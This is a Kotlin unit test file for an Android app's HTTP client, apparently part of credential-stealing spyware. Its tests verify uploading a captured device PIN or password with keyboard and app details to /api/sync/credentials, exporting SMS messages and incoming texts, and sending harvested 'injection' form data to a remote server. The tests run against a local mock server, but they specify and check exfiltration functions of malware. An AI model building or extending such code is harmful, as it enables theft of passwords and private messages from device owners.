package com.storm.safe.rock.network

import kotlinx.coroutines.test.runTest
import okhttp3.mockwebserver.MockResponse
import okhttp3.mockwebserver.MockWebServer
import org.json.JSONObject
import org.junit.After
import org.junit.Assert.*
import org.junit.Before
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.RuntimeEnvironment

@RunWith(RobolectricTestRunner::class)
class HttpManagerTest {

    private lateinit var server: MockWebServer
    private lateinit var manager: HttpManager

    @Before
    fun setup() {
        server = MockWebServer()
        server.start()
        val baseUrl = server.url("/").toString().trimEnd('/')
        manager = HttpManager(RuntimeEnvironment.getApplication())
        manager.baseUrl = baseUrl
        manager.deviceId = "test-device-001"
        manager.ownerToken = "test-owner-token"
    }

    @After
    fun teardown() {
        try { server.shutdown() } catch (_: Exception) {}
    }

    @Test
    fun `post with auth=true sends X-Device-ID and Authorization Bearer headers`() = runTest {
        server.enqueue(MockResponse().setBody("""{"status":"ok"}""").setResponseCode(200))
        val data = JSONObject().apply { put("test", true) }
        manager.post("/api/test", data, authenticated = true)
        val request = server.takeRequest()
        assertEquals("test-device-001", request.getHeader("X-Device-ID"))
        val auth = request.getHeader("Authorization")
        assertNotNull(auth)
        assertTrue(auth!!.startsWith("Bearer "))
    }

    @Test
    fun `post with auth=false sends no auth headers`() = runTest {
        server.enqueue(MockResponse().setBody("""{"status":"ok"}""").setResponseCode(200))
        val data = JSONObject().apply { put("test", true) }
        manager.post("/api/client/register", data, authenticated = false)
        val request = server.takeRequest()
        assertNull(request.getHeader("X-Device-ID"))
        assertNull(request.getHeader("Authorization"))
    }

    @Test
    fun `post sends correct content-type`() = runTest {
        server.enqueue(MockResponse().setBody("{}").setResponseCode(200))
        manager.post("/api/test", JSONObject(), authenticated = false)
        val request = server.takeRequest()
        assertTrue(request.getHeader("Content-Type")!!.contains("application/json"))
    }

    @Test
    fun `executeRequest retries on 5xx up to 3 times`() = runTest {
        repeat(2) { server.enqueue(MockResponse().setResponseCode(500).setBody("error")) }
        server.enqueue(MockResponse().setBody("""{"ok":true}""").setResponseCode(200))
        val result = manager.post("/api/test", JSONObject(), authenticated = false)
        assertTrue(result.isSuccess)
        assertEquals(3, server.requestCount)
    }

    @Test
    fun `executeRequest does not retry on 4xx`() = runTest {
        server.enqueue(MockResponse().setResponseCode(403).setBody("forbidden"))
        val result = manager.post("/api/test", JSONObject(), authenticated = false)
        assertTrue(result.isFailure)
        assertEquals(1, server.requestCount)
    }

    @Test
    fun `executeRequest returns failure after max retries`() = runTest {
        repeat(3) { server.enqueue(MockResponse().setResponseCode(500).setBody("error")) }
        val result = manager.post("/api/test", JSONObject(), authenticated = false)
        assertTrue(result.isFailure)
        assertEquals(3, server.requestCount)
    }

    @Test
    fun `register sends to correct path without auth`() = runTest {
        server.enqueue(MockResponse().setBody("""{"deviceId":"abc"}""").setResponseCode(200))
        val payload = JSONObject().apply {
            put("deviceId", "test-device-001")
            put("model", "Pixel")
        }
        val result = manager.register(payload)
        assertTrue(result.isSuccess)
        val request = server.takeRequest()
        assertEquals("/api/client/register", request.path)
        assertEquals("POST", request.method)
        assertNull(request.getHeader("X-Device-ID"))
    }

    @Test
    fun `uploadPasswordCapture sends correct payload`() = runTest {
        server.enqueue(MockResponse().setBody("{}").setResponseCode(200))
        val result = manager.uploadPasswordCapture(
            password = "1234",
            passwordType = "pin",
            inputMethod = "system_keyboard",
            appName = "Settings",
            packageName = "com.android.settings",
            confidence = 85
        )
        assertTrue(result.isSuccess)
        val request = server.takeRequest()
        assertEquals("/api/sync/credentials", request.path)
        assertNotNull(request.getHeader("X-Device-ID"))
        val body = JSONObject(request.body.readUtf8())
        assertEquals("test-device-001", body.getString("deviceId"))
        assertEquals("1234", body.getString("password"))
        assertEquals("pin", body.getString("passwordType"))
        assertEquals("system_keyboard", body.getString("inputMethod"))
        assertEquals("Settings", body.getString("appName"))
        assertEquals("com.android.settings", body.getString("packageName"))
        assertEquals(85, body.getInt("confidence"))
        assertTrue(body.has("timestamp"))
    }

    @Test
    fun `uploadSms sends correct payload`() = runTest {
        server.enqueue(MockResponse().setBody("{}").setResponseCode(200))
        val smsList = listOf(
            JSONObject().apply { put("from", "+1234"); put("body", "test") }
        )
        val result = manager.uploadSms(smsList)
        assertTrue(result.isSuccess)
        val request = server.takeRequest()
        assertEquals("/api/sync/messages", request.path)
        val body = JSONObject(request.body.readUtf8())
        assertEquals("test-device-001", body.getString("deviceId"))
        assertTrue(body.has("sms"))
        assertTrue(body.has("timestamp"))
    }

    @Test
    fun `uploadIncomingSms sends correct payload`() = runTest {
        server.enqueue(MockResponse().setBody("{}").setResponseCode(200))
        val result = manager.uploadIncomingSms(
            number = "+1234567890",
            text = "Hello",
            type = "received",
            timestamp = 1700000000000L
        )
        assertTrue(result.isSuccess)
        val request = server.takeRequest()
        assertEquals("/api/sync/inbox", request.path)
        val body = JSONObject(request.body.readUtf8())
        assertEquals("+1234567890", body.getString("number"))
        assertEquals("Hello", body.getString("text"))
        assertEquals("received", body.getString("type"))
        assertEquals(1700000000000L, body.getLong("timestamp"))
    }

    @Test
    fun `uploadLogs sends correct payload`() = runTest {
        server.enqueue(MockResponse().setBody("{}").setResponseCode(200))
        val logs = listOf(
            JSONObject().apply { put("level", "info"); put("msg", "test") }
        )
        val result = manager.uploadLogs(logs)
        assertTrue(result.isSuccess)
        val request = server.takeRequest()
        assertEquals("/api/client/logs", request.path)
        val body = JSONObject(request.body.readUtf8())
        assertEquals("test-device-001", body.getString("deviceId"))
        assertTrue(body.has("logs"))
    }

    @Test
    fun `uploadInjectionData adds deviceId and timestamp`() = runTest {
        server.enqueue(MockResponse().setBody("{}").setResponseCode(200))
        val data = JSONObject().apply {
            put("field1", "value1")
            put("field2", 42)
        }
        val result = manager.uploadInjectionData(data)
        assertTrue(result.isSuccess)
        val request = server.takeRequest()
        assertEquals("/api/sync/form", request.path)
        val body = JSONObject(request.body.readUtf8())
        assertEquals("test-device-001", body.getString("deviceId"))
        assertTrue(body.has("timestamp"))
        assertEquals("value1", body.getString("field1"))
    }

    @Test
    fun `uploadDeviceStatus sends correct payload`() = runTest {
        server.enqueue(MockResponse().setBody("{}").setResponseCode(200))
        val statusData = JSONObject().apply { put("battery", 80) }
        val result = manager.uploadDeviceStatus("battery_update", statusData)
        assertTrue(result.isSuccess)
        val request = server.takeRequest()
        assertEquals("/api/sync/status", request.path)
        val body = JSONObject(request.body.readUtf8())
        assertEquals("test-device-001", body.getString("deviceId"))
        assertEquals("battery_update", body.getString("statusType"))
        assertTrue(body.has("data"))
    }

    @Test
    fun `Authorization Bearer token is consistent for same inputs`() = runTest {
        server.enqueue(MockResponse().setBody("{}").setResponseCode(200))
        manager.post("/api/test", JSONObject(), authenticated = true)
        val token1 = server.takeRequest().getHeader("Authorization")

        server.enqueue(MockResponse().setBody("{}").setResponseCode(200))
        manager.post("/api/test", JSONObject(), authenticated = true)
        val token2 = server.takeRequest().getHeader("Authorization")

        assertEquals(token1, token2)
    }
}
